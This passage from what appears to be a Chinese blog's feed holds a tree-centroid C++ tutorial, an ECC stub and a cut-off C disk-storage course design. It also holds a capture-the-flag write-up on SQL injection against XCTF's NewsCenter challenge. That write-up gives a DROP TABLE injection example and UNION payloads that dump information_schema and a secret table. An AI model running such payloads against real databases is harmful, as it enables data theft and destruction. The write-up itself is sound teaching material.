data-mml-node="TeXAtom" transform="translate(550.5, -1050) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use xlink:href="#MJX-2-TEX-I-1D463"/></g></g><g data-mml-node="TeXAtom" transform="translate(722, 1150) scale(0.707)" data-mjx-texclass="ORD"/></g><g data-mml-node="mi" transform="translate(7539.7, 0)"><use xlink:href="#MJX-2-TEX-I-1D460"/></g><g data-mml-node="mi" transform="translate(8008.7, 0)"><use xlink:href="#MJX-2-TEX-I-1D456"/></g><g data-mml-node="mi" transform="translate(8353.7, 0)"><use xlink:href="#MJX-2-TEX-I-1D467"/></g><g data-mml-node="mi" transform="translate(8818.7, 0)"><use xlink:href="#MJX-2-TEX-I-1D452"/></g><g data-mml-node="mo" transform="translate(9284.7, 0)"><use xlink:href="#MJX-2-TEX-N-5B"/></g><g data-mml-node="mi" transform="translate(9562.7, 0)"><use xlink:href="#MJX-2-TEX-I-1D463"/></g><g data-mml-node="mo" transform="translate(10047.7, 0)"><use xlink:href="#MJX-2-TEX-N-5D"/></g></g></g></svg></p>
<p>其中<code>v</code>是每一个<code>u</code>的邻接节点。</p>
<p><code>C++</code>实现方式</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> total;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_N = <span class="number">10000</span>;</span><br><span class="line"><span class="comment">// 邻接表</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; treeTable[MAX_N + <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// treeSize[i]表示以i为根、向下包含的子树的节点个数（包含自身）</span></span><br><span class="line"><span class="keyword">int</span> treeSize[MAX_N + <span class="number">5</span>];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="keyword">int</span> minNode;</span><br><span class="line"><span class="keyword">int</span> minBalance = INF;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> nodeId, <span class="keyword">int</span> parent)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 至少为 1</span></span><br><span class="line">    treeSize[nodeId] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// maxSubTree代表nodeId的各个子结点中最大的子树数目</span></span><br><span class="line">    <span class="keyword">int</span> maxSubTree = <span class="number">-1</span>, len = treeTable[nodeId].<span class="built_in">size</span>(), son;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        son = treeTable[nodeId][i];</span><br><span class="line">        <span class="keyword">if</span> (son != parent) &#123;</span><br><span class="line">            dfs(son, nodeId);</span><br><span class="line">            treeSize[nodeId] += treeSize[son];</span><br><span class="line">            maxSubTree = <span class="built_in">max</span>(maxSubTree, treeSize[son]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 向下或者向上的子树中，选取一个，即父节点所在的子树也是作为该节点的“子树”</span></span><br><span class="line">    maxSubTree = <span class="built_in">max</span>(maxSubTree, total - treeSize[nodeId]);</span><br><span class="line">    <span class="keyword">if</span> (maxSubTree &lt; minBalance) &#123;</span><br><span class="line">        minBalance = maxSubTree;</span><br><span class="line">        minNode = nodeId;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please input the number of total node\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;total);</span><br><span class="line">    <span class="keyword">int</span> u, v;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please input every edge as u v\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= total - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;u, &amp;v);</span><br><span class="line">        treeTable[u].push_back(v);</span><br><span class="line">        treeTable[v].push_back(u);</span><br><span class="line">    &#125;</span><br><span class="line">    minNode = <span class="number">0</span>;</span><br><span class="line">    minBalance = INF;</span><br><span class="line">    dfs(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The center of gravity of the tree is %d, Maximum node number of a subtree is %d\n"</span>,</span><br><span class="line">             minNode, minBalance);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="带权树"><a href="#带权树" class="headerlink" title="带权树"></a>带权树</h3><p>以洛谷<a href="https://www.luogu.com.cn/problem/P1364" target="_blank" rel="noopener">P1364</a>为例，其它背景亦类似：</p>
<p>该题可转为找树的重心进行求解。</p>
<p>使用<code>f[u]</code>表示以<code>u</code>为根的总距离 ， <code>size[u]</code>表示以<code>u</code>为根的子树的大小（当然了，本题要设置为相应的权值） ，因此子树的重心就是：</p>
<p><code>w</code>,其中<code>f[w] = min(f[i]),1 &lt;= i &lt;= n</code>.</p>
<p>在算法的开始之前，需要先任意求一个点作为根进行深度优先搜索，求出以该点为根的总距离，这里以<code>1</code>为例。</p>
<p>对于每一个<code>u</code>能达到的点<code>v</code> ，可以使用下面的方程进行求解：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f[v] &#x3D; f[u] + size[1] - size[v] - size[v]</span><br></pre></td></tr></table></figure>

<p>上面的式子的意义是：</p>
<p> 当根从<code>u</code>变为<code>v</code>的时候，<code>v</code>的子树的所有节点原本的距离要到 <code>u</code>，现在只需要到<code>v</code>，即这<code>size[v]</code>个节点距离都减小<code>1</code>，与此同时，除了以<code>v</code>为根的子树节点外的所有的点，原本只要到<code>u</code>即可，现在要到<code>v</code>，即每个节点距离都增加了<code>1</code>，而这些节点共有<code>size[1] - size[v]</code>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_N = <span class="number">101</span>;</span><br><span class="line"><span class="keyword">int</span> treeTable[MAX_N][<span class="number">2</span>], nums[MAX_N], treeSize[MAX_N], f[MAX_N];</span><br><span class="line"><span class="comment">// deepth 是该节点距离 1 号节点的距离</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> nodeId, <span class="keyword">int</span> parent, <span class="keyword">int</span> deepth)</span></span>&#123;</span><br><span class="line">    treeSize[nodeId] = nums[nodeId];</span><br><span class="line">    <span class="keyword">int</span> lChild = treeTable[nodeId][<span class="number">0</span>], rChild = treeTable[nodeId][<span class="number">1</span>];</span><br><span class="line">    <span class="comment">// 如果存在左孩子</span></span><br><span class="line">    <span class="keyword">if</span> (lChild)&#123;</span><br><span class="line">        dfs(lChild, nodeId, deepth + <span class="number">1</span>);</span><br><span class="line">        treeSize[nodeId] += treeSize[lChild];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果存在右孩子</span></span><br><span class="line">    <span class="keyword">if</span> (rChild)&#123;</span><br><span class="line">        dfs(rChild, nodeId, deepth + <span class="number">1</span>);</span><br><span class="line">        treeSize[nodeId] += treeSize[rChild];</span><br><span class="line">    &#125;</span><br><span class="line">    f[<span class="number">1</span>] += nums[nodeId] * deepth;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> minAns = <span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dp</span><span class="params">(<span class="keyword">int</span> nodeId, <span class="keyword">int</span> parent)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lChild = treeTable[nodeId][<span class="number">0</span>], rChild = treeTable[nodeId][<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>(lChild)&#123;</span><br><span class="line">        f[lChild] = f[nodeId] + treeSize[<span class="number">1</span>] - (treeSize[lChild] &lt;&lt; <span class="number">1</span>);</span><br><span class="line">        dp(lChild, nodeId);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(rChild)&#123;</span><br><span class="line">        f[rChild] = f[nodeId] + treeSize[<span class="number">1</span>] - (treeSize[rChild] &lt;&lt; <span class="number">1</span>);</span><br><span class="line">        dp(rChild, nodeId);</span><br><span class="line">    &#125;</span><br><span class="line">    minAns = <span class="built_in">min</span>(minAns, f[nodeId]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">int</span> n, w, u, v;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;nums[i], &amp;treeTable[i][<span class="number">0</span>], &amp;treeTable[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    dp(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; minAns &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>贪心算法</tag>
        <tag>动态规划</tag>
        <tag>递归</tag>
        <tag>C++</tag>
        <tag>深度优先</tag>
      </tags>
  </entry>
  <entry>
    <title>模糊查询之SQL注入（攻防世界NewsCenter题解）</title>
    <url>/2022/05/22/%E6%A8%A1%E7%B3%8A%E6%9F%A5%E8%AF%A2%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CNewsCenter%E9%A2%98%E8%A7%A3%EF%BC%89/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>SQL</code>注入是由于开发人员编写程序不当，攻击者可以在开发人员编写好的<code>SQL</code>语句的基础上，构造额外的<code>SQL</code>语句，从而发生意外的错误。</p>
<a id="more"></a>

<p>例如，如果我们有一个根据<code>id</code>查询的语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> test_table <span class="keyword">where</span> <span class="keyword">id</span> = test_id</span><br></pre></td></tr></table></figure>

<p>使用高级语言编写语句：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String sql = <span class="string">"select * from test_table where id = "</span> + test_id;</span><br></pre></td></tr></table></figure>

<p>如果攻击者尝试将<code>test_id</code>构造成</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">2;<span class="keyword">DROP</span> <span class="keyword">TABLE</span> test_table;</span><br></pre></td></tr></table></figure>

<p>那么最终执行的<code>SQL</code>语句为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> test_table <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> test_table;</span><br></pre></td></tr></table></figure>

<p>当然你可能会说攻击者不知道表名，因此上面的很难构造出来。但是我想说的是如果存在<code>SQL</code>注入风险的时候，<strong>攻击者获取表名的方式你难以想象得到</strong>。</p>
<h2 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h2><p>攻防世界<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4686&page=1" target="_blank" rel="noopener"><code>NewsCenter</code></a></p>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>打开场景后，发现是一个新闻页面，输入框中输入内容，然后进行模糊查询。</p>
<p>而模糊查询的一般语句为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">'%str%'</span></span><br></pre></td></tr></table></figure>

<p>尝试输入<code>%&#39;</code>，发现后台报错，因此判定后台可以进行<code>SQL</code>注入。</p>
<p>然后略加思考，<code>flag</code>应该就藏在当前的数据库中？因此先数据库名；先输入<code>%&#39;;SELECT DATABASE(); --</code>（中划线是将后面的<code>SQL</code>语句处理成注释形式），发现并没有返回预期的结果，然后想了想，查询到的数据应该是有好几列，然后一行是一个新闻，将其渲染，再返回到浏览器，接着分析了一下，每个新闻都有标题和内容，查询应该至少有两列，再次尝试构造<code>SQL</code>语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">%' UNION  <span class="keyword">SELECT</span> <span class="keyword">DATABASE</span>(),<span class="keyword">DATABASE</span>(); <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p><code>UNION</code>的意思是说将两个查询结果合并，可以执行的前提是两个查询有相同的列数，具体用法可以去网上查查。</p>
<p>发现还是报错，再次增加一列进行尝试：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">%' UNION  <span class="keyword">SELECT</span> <span class="keyword">DATABASE</span>(),<span class="keyword">DATABASE</span>(), <span class="keyword">DATABASE</span>(); <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>果然在最后的新闻列表中出现了数据库名<code>news</code>。</p>
<p>然后看看该数据库中都有哪些表：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aaaaaaaa%' UNION <span class="keyword">SELECT</span> table_name,table_name,table_name <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="string">'news'</span>; <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>aaaaaaaa</code>可以随便设置，最好是新闻中没有出现过的字符，这样子就方便获取我们想要的内容了。</p>
</blockquote>
<p>然后发现有两张表，一个是<code>news</code>，另一个是<code>secret_table</code>！</p>
<p>然后看看第二张表的字段名：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aaaaa%' UNION  <span class="keyword">SELECT</span> COLUMN_NAME,COLUMN_NAME,COLUMN_NAME <span class="keyword">FROM</span> information_schema.COLUMNS <span class="keyword">WHERE</span> table_name = <span class="string">'secret_table'</span>; <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>出现了一个<code>fl4g</code>字段名，再继续查询</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aaaaa%' UNION  <span class="keyword">SELECT</span> fl4g, fl4g, fl4g <span class="keyword">FROM</span> secret_table; <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>返回了<code>QCTF{sq1_inJec7ion_ezzz}</code>。至此，本题答案<strong>水落石出</strong></p>
<hr>
<p>==黑帽白帽，就在一念之间！==</p>
]]></content>
      <categories>
        <category>攻防世界</category>
      </categories>
      <tags>
        <tag>MySql</tag>
      </tags>
  </entry>
  <entry>
    <title>椭圆曲线加密ECC</title>
    <url>/2022/10/26/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%8A%A0%E5%AF%86ECC/</url>
    <content><![CDATA[<p>我们之前介绍过了RSA加密算法，它是一种公钥密码，今天介绍的椭圆曲线加密算法也属于公钥加密算法。</p>
]]></content>
  </entry>
  <entry>
    <title>模拟设计磁盘文件的链接存储结构</title>
    <url>/2020/07/02/%E6%A8%A1%E6%8B%9F%E8%AE%BE%E8%AE%A1%E7%A3%81%E7%9B%98%E6%96%87%E4%BB%B6%E7%9A%84%E9%93%BE%E6%8E%A5%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h2 id="课题要求"><a href="#课题要求" class="headerlink" title="课题要求"></a>课题要求</h2><ol>
<li><p>磁盘文件的管理采用显式链接结构，将文件占用的物理块号和链接指针记录 在一张文件分配表（<code>FAT</code>）中。文件第一块的块号记录在索引结点中。<a id="more"></a>文件目录 只记录文件名和索引结点的编号。索引结点的结构如下： </p>
<table>
<thead>
<tr>
<th>索引结点编号</th>
<th>文件属性</th>
<th>创建时间</th>
<th>文件第一块块号</th>
<th>文件占用盘块数</th>
<th>备用</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
</li>
<li><p>假定磁盘存储空间共有 100 个物理块用于存放数据， 目录文件和索引结点可 直接访问，不存放在这 100 个块中。</p>
</li>
<li><p>一个物理块可存放 3 个文件逻辑记录，并且假设文件逻辑记录定长。</p>
</li>
<li><p>要求用键盘输入的方式模拟用户读写请求，菜单格式建议如下： </p>
<ul>
<li><code>Create（filename）</code> </li>
<li><code>Write（filename， text， logical_record_no）</code> </li>
<li><code>Read (filename, logical_record_no)</code> </li>
<li><code>Delete（filename）</code> 其中<code>filename</code>是要读写的文件名，<code>text</code> 是写入的内容，<code>logical_record_no</code>是逻辑 记录号。<code>Create</code>、<code>Write</code>、<code>Read</code>、<code>Delete</code>分别表示创建一个文件，向文件的某个逻 辑记录写，从文件的某个逻辑记录读，删除一个文件。 </li>
</ul>
</li>
<li><p>文件存储空间管理采用位示图（位示图为 7 行，16 列）的方式。 </p>
</li>
<li><p>要求程序可以打印<code>FAT</code>以及位示图的情况。 </p>
</li>
</ol>
<h2 id="结构设计"><a href="#结构设计" class="headerlink" title="结构设计"></a>结构设计</h2><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><ul>
<li><p>结点项</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Inode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> firstBlockId;     <span class="comment">// 文件第一块块号</span></span><br><span class="line">    <span class="keyword">int</span> lastBlockId;      <span class="comment">// 文件最后一块块号</span></span><br><span class="line">    <span class="keyword">int</span> usedBlocksNum;    <span class="comment">// 文件占用的盘块数</span></span><br><span class="line">    <span class="keyword">time_t</span> createTime;    <span class="comment">// 文件创建时间</span></span><br><span class="line">    <span class="keyword">time_t</span> LastEditTime;  <span class="comment">// 文件上次修改时间</span></span><br><span class="line">    <span class="keyword">int</span> permission;       <span class="comment">// 文件权限</span></span><br><span class="line">    <span class="keyword">int</span> isDelete;         <span class="comment">// 该节点是否被标记“已删除”</span></span><br><span class="line">    <span class="keyword">char</span> standby[<span class="number">20</span>];     <span class="comment">// 备用</span></span><br><span class="line">&#125; Inode;</span><br></pre></td></tr></table></figure>
</li>
<li><p>目录项</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">listItem</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> fileName[<span class="number">256</span>];  <span class="comment">// 文件名字</span></span><br><span class="line">    <span class="keyword">int</span> nodeId;          <span class="comment">// 文件对应的结点编号</span></span><br><span class="line">&#125; listItem;</span><br></pre></td></tr></table></figure>
</li>
<li><p>物理盘块号</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Block</span> &#123;</span></span><br><span class="line">    <span class="comment">// 每一个物理块有三块逻辑记录号</span></span><br><span class="line">    <span class="keyword">char</span> firstLogical[LOGICALSIZE];</span><br><span class="line">    <span class="keyword">char</span> secondLogical[LOGICALSIZE];</span><br><span class="line">    <span class="keyword">char</span> thirdogical[LOGICALSIZE];</span><br><span class="line">&#125; Block;</span><br></pre></td></tr></table></figure>
</li>
<li><p>抽象磁盘</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Disk</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> FAT[BLOCKNUM];             <span class="comment">// 最多有BLOCKNUM个表项</span></span><br><span class="line">    <span class="keyword">int</span> bitmap[ROW][COL];          <span class="comment">// 示位图</span></span><br><span class="line">    listItem directory[BLOCKNUM];  <span class="comment">// 目录 最多有BLOCKNUM个目录项</span></span><br><span class="line">    Inode FDI[BLOCKNUM];  <span class="comment">// 索引结点集合 最多有BLOCKNUM个节点</span></span><br><span class="line">    <span class="keyword">int</span> fileNum;</span><br><span class="line">    Block blocks[BLOCKNUM];  <span class="comment">// 总的物理盘块数</span></span><br><span class="line">    <span class="keyword">int</span> freeBlock;           <span class="comment">// 空闲盘块数量</span></span><br><span class="line">&#125; Disk;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h3><p>程序一开始将磁盘格式化，然后根据用户选择进行相关操作。</p>
<ul>
<li><p>创建文件：</p>
<p>首先申请一块空闲盘块（即默认一个文件初始占用一块盘块），同时将申请到的盘块记为“已使用”状态。</p>
<p>申请方式是：选定一个随机数作为“基址”，假如该盘块已被占用，尝试申请该“基址”的下一块，假若仍然被占用，则继续往后尝试………</p>
</li>
<li><p>读取文件：</p>
<p>根据文件名，在目录中检索，将该文件对应的索引结点找到。然后根据欲读取的逻辑记录号进行尝试读取（一个文件最多拥有的逻辑记录号为：<code>max = 3 * n - 1</code>，<code>n</code>是文件占用盘块数，即编号从零开始）。</p>
<p>方法是：根据在检索目录得到的索引结点获得该文件占用的第一块盘块号，假如该盘块不是用户所要读取的盘块，则根据文件分配表获取下一块盘块号，不断重复上面过程，直到找到目的盘块号。</p>
</li>
<li><p>写入文件</p>
<ul>
<li><p>写入数据：</p>
<p>向某个文件的某个逻辑记录号中写入数据，写入之前检查逻辑记录号的合法性</p>
</li>
<li><p>修改文件大小：假若新文件大小小于旧文件大小，则只保留新文件大小的数据</p>
</li>
</ul>
</li>
<li><p>删除文件：</p>
<p>先根据文件名，在目录中检索出相应的索引结点，根据索引结点获得第一块盘块号，将该盘块置为“未使用状态”，并将这一盘块指向的下一块盘块（假如存在）也置为“未使用”，依此重复，直至该文件占用盘块全都归还。同时盘块对应的示位图也要更新状态。</p>
</li>
</ul>
<h2 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-06-07 15:53:40</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-07-01 21:08:41</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description: 操作系统课程设计</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\OS\design\main.c</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGICALSIZE 1024  <span class="comment">//一条逻辑记录的大小</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BLOCKNUM 100      <span class="comment">//物理块数</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROW 7             <span class="comment">//示位图行数</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COL 16            <span class="comment">//示位图列数</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FREE 0            <span class="comment">//示位图中表示空闲状态</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USED 1            <span class="comment">//示位图中表示已用状态</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> OK = <span class="number">1</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 目录项</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">listItem</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> fileName[<span class="number">256</span>];  <span class="comment">// 文件名字</span></span><br><span class="line">    <span class="keyword">int</span> nodeId;          <span class="comment">// 文件对应的结点编号</span></span><br><span class="line">&#125; listItem;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Block</span> &#123;</span></span><br><span class="line">    <span class="comment">// 每一个物理块有三块逻辑记录号</span></span><br><span class="line">    <span class="keyword">char</span> firstLogical[LOGICALSIZE];</span><br><span class="line">    <span class="keyword">char</span> secondLogical[LOGICALSIZE];</span><br><span class="line">    <span class="keyword">char</span> thirdogical[LOGICALSIZE];</span><br><span class="line">&#125; Block;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Inode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> firstBlockId;     <span class="comment">// 文件第一块块号</span></span><br><span class="line">    <span class="keyword">int</span> lastBlockId;      <span class="comment">// 文件最后一块块号</span></span><br><span class="line">    <span class="keyword">int</span> usedBlocksNum;    <span class="comment">// 文件占用的盘块数</span></span><br><span class="line">    <span class="keyword">time_t</span> createTime;    <span class="comment">// 文件创建时间</span></span><br><span class="line">    <span class="keyword">time_t</span> LastEditTime;  <span class="comment">// 文件上次修改时间</span></span><br><span class="line">    <span class="keyword">int</span> permission;       <span class="comment">// 文件权限</span></span><br><span class="line">    <span class="keyword">int</span> isDelete;         <span class="comment">// 该节点是否被标记“已删除”</span></span><br><span class="line">    <span class="keyword">char</span> standby[<span class="number">20</span>];     <span class="comment">// 备用</span></span><br><span class="line">&#125; Inode;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Disk</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> FAT[BLOCKNUM];             <span class="comment">// 最多有BLOCKNUM个表项</span></span><br><span class="line">    <span class="keyword">int</span> bitmap[ROW][COL];          <span class="comment">// 示位图</span></span><br><span class="line">    listItem directory[BLOCKNUM];  <span class="comment">// 目录 最多有BLOCKNUM个目录项</span></span><br><span class="line">    Inode FDI[BLOCKNUM];  <span class="comment">// 索引结点集合 最多有BLOCKNUM个节点</span></span><br><span class="line">    <span class="keyword">int</span> fileNum;</span><br><span class="line">    Block blocks[BLOCKNUM];  <span class="comment">// 总的物理盘块数</span></span><br><span class="line">    <span class="keyword">int</span> freeBlock;           <span class="comment">// 空闲盘块数量</span></span><br><span class="line">&#125; Disk;</span><br><span class="line">Disk d;</span><br><span class="line"><span class="keyword">int</span> dirLastIndex;  <span class="comment">// 最后的目录项下标</span></span><br><span class="line"><span class="keyword">int</span> fdiLastIndex;  <span class="comment">// 最后的索引结点下标</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 申请成功，则返回申请的物理块号</span></span><br><span class="line"><span class="comment"> * 否则返回-1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getFreeBlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (d.freeBlock &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// 